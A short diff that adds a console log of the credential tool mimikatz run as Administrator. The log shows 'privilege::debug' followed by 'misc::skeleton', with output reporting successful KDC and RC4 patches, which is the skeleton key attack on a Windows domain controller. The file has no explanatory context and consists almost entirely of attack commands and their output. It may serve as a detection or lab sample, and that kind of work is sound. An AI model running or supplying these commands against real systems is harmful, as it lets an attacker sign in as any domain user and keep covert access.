@@ -1,0 +1,24 @@
+C:\Users\Administrator\Downloads>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # misc::skeleton
+[KDC] data
+[KDC] struct
+[KDC] keys patch OK
+[RC4] functions
+[RC4] init patch OK
+[RC4] decrypt patch OK
+
+mimikatz #
+
+
+
